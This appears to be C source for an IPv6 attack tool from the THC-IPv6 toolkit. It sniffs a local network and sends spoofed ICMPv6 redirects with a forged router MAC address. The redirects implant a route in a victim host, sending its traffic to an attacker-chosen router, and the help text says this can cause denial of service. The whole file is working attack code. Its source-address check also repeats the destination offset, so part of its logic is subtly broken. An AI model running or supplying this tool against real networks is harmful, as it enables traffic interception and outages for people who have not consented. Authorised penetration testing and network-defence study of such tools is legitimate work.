#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <time.h>
#include <pcap.h>
#include "thc-ipv6.h"

unsigned char *pkt = NULL, buf[16], mac[16] = "", *realownmac;
unsigned char *mac6 = mac, *src6, *dest6, *oldrouter6, *newrouter6, *self6,
              *fakemac;
char *interface;

void help(char *prg) {
  printf("%s %s (c) 2022 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
  printf(
      "Syntax: %s interface victim-ip destination-ip original-router "
      "[new-router [new-router-mac]]\n\n",
      prg);
  printf(
      "Implant a route into victim-ip, which redirects all traffic to "
      "destination-ip to\n");
  printf(
      "new-router. This is done on all traffic that flows by that matches\n");
  printf(
      "victim->target. You must know the router which would handle the "
      "route.\n");
  printf("If the new-router/-mac does not exist, this results in a DOS.\n");
  printf(
      "You can supply a wildcard ('*') for victim-ip and/or destination-ip.\n");
  exit(-1);
}

void intercept(u_char *foo, const struct pcap_pkthdr *header,
               const unsigned char *data) {
  char *ptr, *ptr2;

  // packet is to the real router, and is not from us?
  if (memcmp(realownmac, data + 6, 6) == 0 || memcmp(fakemac, data, 6) != 0)
    return;

  // check that source and dest are routed

  // same network?
  if (memcmp(data + 14 + 8, data + 14 + 8 + 16, 8) == 0) return;
  // dst fe.. or ff.. or 00?
  if (data[14 + 8 + 16] >= 0xfe || data[14 + 8 + 16] == 0) return;
  // src fe.. or ff.. or 00?
  if (data[14 + 8 + 16] >= 0xfe || data[14 + 8 + 16] == 0) return;

  if (src6 != NULL) {  // victim wildcard? if not, check src
    if (memcmp(src6, data + 14 + 8, 16) != 0) return;
  } else {  // victim wildcard - we have to ensure that the source is local ->
            // hop count!
    if (data[14 + 7] != 64 && data[14 + 7] != 128 && data[14 + 7] != 255)
      return;
  }
  if (dest6 != NULL)  // destination wildcard? if not, check dst
    if (memcmp(dest6, data + 14 + 8 + 16, 16) != 0) return;

  thc_redir6(interface, oldrouter6, fakemac, (unsigned char *)data + 6,
             newrouter6, mac6, (unsigned char *)data + 14, header->caplen - 14);

  ptr = thc_ipv62notation((unsigned char *)data + 14 + 8);
  ptr2 = thc_ipv62notation((unsigned char *)data + 14 + 8 + 16);
  printf("Sent ICMPv6 redirect for %s -> %s\n", ptr, ptr2);
  free(ptr);
  free(ptr2);
}

int main(int argc, char *argv[]) {
  int  rawmode = 0, offset = 14;
  char string[256] = "ip6";

  if (argc < 5 || strncmp(argv[1], "-h", 2) == 0) help(argv[0]);

  if (strcmp(argv[1], "-r") == 0) {
    thc_ipv6_rawmode(1);
    rawmode = 1;
    argv++;
    argc--;
  }

  if (do_hdr_size) offset = do_hdr_size;
  interface = argv[1];
  if ((src6 = thc_resolve6(argv[2])) == NULL) {
    if (strcmp(argv[2], "*") != 0) {
      fprintf(stderr,
              "Error: victim-ip is not a valid IPv6 address or '*': %s\n",
              argv[2]);
      exit(-1);
    }
  }
  if ((dest6 = thc_resolve6(argv[3])) == NULL) {
    if (strcmp(argv[3], "*") != 0) {
      fprintf(stderr,
              "Error: destination-ip is not a valid IPv6 address or '*': %s\n",
              argv[3]);
      exit(-1);
    }
  }

  if ((oldrouter6 = thc_resolve6(argv[4])) == NULL) {
    fprintf(stderr, "Error: old-router is not a valid IPv6 address: %s\n",
            argv[4]);
    exit(-1);
  }

  if (argc >= 6) {
    if ((newrouter6 = thc_resolve6(argv[5])) == NULL) {
      fprintf(stderr, "Error: new-router is not a valid IPv6 address: %s\n",
              argv[5]);
      exit(-1);
    }
  } else
    newrouter6 = thc_get_own_ipv6(interface, NULL, PREFER_LINK);

  /* Spoof source mac */
  if ((self6 = thc_get_own_ipv6(interface, oldrouter6, PREFER_GLOBAL)) ==
      NULL) {
    fprintf(stderr,
            "Error: could not get own IP address to contact original-router\n");
    exit(-1);
  }
  if ((fakemac = thc_get_mac(interface, self6, oldrouter6)) == NULL) {
    fprintf(stderr,
            "Error: could not resolve mac address for original-router\n");
    free(self6);
    exit(-1);
  }

  mac6 = mac;
  if (argc >= 7)
    sscanf(argv[6], "%x:%x:%x:%x:%x:%x", (unsigned int *)&mac[0],
           (unsigned int *)&mac[1], (unsigned int *)&mac[2],
           (unsigned int *)&mac[3], (unsigned int *)&mac[4],
           (unsigned int *)&mac[5]);
  else
    mac6 = thc_get_own_mac(interface);
  realownmac = thc_get_own_mac(interface);

  if (src6 != NULL) {
    strcat(string, " and src ");
    strcat(string, thc_ipv62notation(src6));
  }
  if (dest6 != NULL) {
    strcat(string, " and dst ");
    strcat(string, thc_ipv62notation(dest6));
  }

  printf(
      "Starting sniffer to get traffic to be redirected (press Control-C to "
      "end) ...\n");
  return thc_pcap_function(interface, string, (char *)intercept, 1, NULL);
}
